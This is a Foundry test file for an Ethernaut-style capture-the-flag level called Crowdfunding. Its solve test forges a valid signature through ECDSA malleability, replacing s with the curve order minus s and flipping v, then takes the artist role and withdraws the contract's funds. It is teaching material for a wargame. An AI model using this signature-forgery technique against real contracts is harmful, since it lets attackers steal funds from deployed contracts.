// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {Crowdfunding} from "src/levels/Crowdfunding.sol";
import {CrowdfundingFactory} from "src/levels/CrowdfundingFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

contract TestCrowdfunding is Test, Utils {
    Ethernaut ethernaut;
    Crowdfunding instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(3);

        address initialArtist = users[0];
        vm.label(initialArtist, "Initial Artist");

        player = users[1];
        vm.label(player, "Player");

        owner = users[2];
        vm.label(owner, "Owner");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        CrowdfundingFactory factory = new CrowdfundingFactory();
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        uint256 gasStart = gasleft();
        instance = Crowdfunding(
            payable(
                createLevelInstance(ethernaut, Level(address(factory)), 1 ether)
            )
        );
        uint256 gasEnd = gasleft();
        console.log("Gas to create instance:", gasStart - gasEnd);
        vm.stopPrank();
    }

    function _splitSignature(
        bytes memory signature
    ) internal pure virtual returns (bytes32 r, bytes32 s, uint8 v) {
        if (signature.length == 65) {
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.prank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;

        bytes memory signature = instance.lastSignature();
        (bytes32 r, bytes32 s, uint8 v) = _splitSignature(signature);

        uint8 manipulatedV = v % 2 == 0 ? v - 1 : v + 1;
        uint256 manipulatedS = n - uint256(s);
        bytes memory manipulatedSignature = abi.encodePacked(
            r,
            bytes32(manipulatedS),
            manipulatedV
        );

        vm.startPrank(player);
        instance.setArtist(player, manipulatedSignature);
        instance.withdraw();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
        vm.stopPrank();
    }
}
